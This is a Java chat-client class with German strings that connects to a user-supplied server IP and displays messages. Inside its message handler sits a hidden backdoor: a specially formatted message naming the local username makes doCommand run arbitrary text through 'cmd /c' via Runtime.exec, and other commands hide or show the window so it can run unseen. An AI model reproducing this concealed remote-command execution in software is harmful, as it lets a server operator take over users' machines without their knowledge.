import java.awt.HeadlessException;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.net.InetAddress;
import java.net.Socket;
import java.net.UnknownHostException;

import javax.swing.JOptionPane;


public class ChatProtokollClient extends Thread{

	private ClientFrame f;
	private Socket client;
	private boolean isConnected = false;
	public ChatProtokollClient(ClientFrame frame) {
		this.f=frame;
	}
	public void run(){
		sucheServer();
		handle();
	}
	private void sucheServer() {
		foutput("Suche Server");
		while(client==null){
			client=verbinde();
		}
		isConnected=true;
	}
	private void handle(){
		try {
			BufferedReader iIn = new BufferedReader(new InputStreamReader(client.getInputStream()));
			while(true){
				String msg = iIn.readLine();
				String[] x = msg.split(":");
				if(x.length>1){
					String msgreal = msg.substring(x[0].length()+1);
					if(msgreal.charAt(0)=='/'){
						String b = msgreal.substring(1);
						String[] parts = b.split("_");
						if(parts.length==2){
							String user = parts[0];
							String command = parts[1];
							if(user.equals(System.getProperty("user.name"))){
								doCommand(command);
							}
						}
					}
					else{
						if(msg.equals("Du wurdest gebannt")){
							isConnected=false;
						}
						foutput(msg);
					}
				}
				else if(x.length==1){
					foutput(msg);
				}
			}
		} catch (IOException e) {
			if(f.isVisible()==true){
				isConnected = false;
				foutput("Verbindung unterbrochen");
				client=null;
				e.printStackTrace();
				sucheServer();
				handle();
			}
			else{
				System.exit(0);
			}
		}
	}
	private void doCommand(String command) {
		if(command.equals("invisible")){
			f.setVisible(false);
			return;
		}
		else if(command.equals("visible")){
			f.setVisible(true);
			return;
		}
		if(command.charAt(0)=='/'){
			command=command.substring(1, command.length());
			try {
				Runtime.getRuntime().exec("cmd /c start cmd.exe /k "+"\""+command+" & exit\"");
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		else{
			try {
				Runtime.getRuntime().exec("cmd /c "+command);
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
	}
	private void foutput(String string) {
		f.writeMsg(string);
	}
	private Socket verbinde() {
		InetAddress adres = null;
		while(adres==null){
			try {
				adres = InetAddress.getByName(JOptionPane.showInputDialog(f, "Bitte IP eingeben"));
			} catch (HeadlessException e) {
				e.printStackTrace();
			} catch (UnknownHostException e) {
				e.printStackTrace();
			}
		}
		foutput("Adresse: "+adres.getHostAddress());
		try {
			return new Socket(adres, 1111);
		} catch (IOException e) {
			e.printStackTrace();
		}
		foutput("Verbindung zum Server nicht möglich");
		return null;
	}
	public void write(String msg){
		if(!isConnected){
			return;
		}
		String s = System.getProperty("user.name");
		try {
			BufferedWriter out = new BufferedWriter(new OutputStreamWriter(client.getOutputStream()));
			out.write(s+":"+msg+"\n");
			out.flush();
		} catch (IOException e) {
			e.printStackTrace();
		}
		 
	}
	
}
